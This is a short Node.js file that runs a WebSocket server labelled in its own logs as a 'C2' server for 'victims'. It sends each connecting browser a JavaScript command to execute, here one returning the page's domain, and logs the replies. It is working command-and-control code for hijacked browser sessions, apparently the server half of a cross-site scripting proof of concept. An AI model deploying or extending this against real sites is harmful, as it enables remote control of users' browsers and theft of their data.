const http = require("http");
const WebSocket = require("ws");

const server = http.createServer();
const wss = new WebSocket.Server({ server });

wss.on("connection", ws => {
  console.log("👀 Victim connected");
  ws.send(JSON.stringify({ js: "ws.send(document.domain)" }));

  ws.on("message", msg => {
    console.log("📦 Victim says:", msg);
  });
});

server.listen(process.env.PORT || 8080, () => {
  console.log("🔥 C2 WebSocket server running...");
});
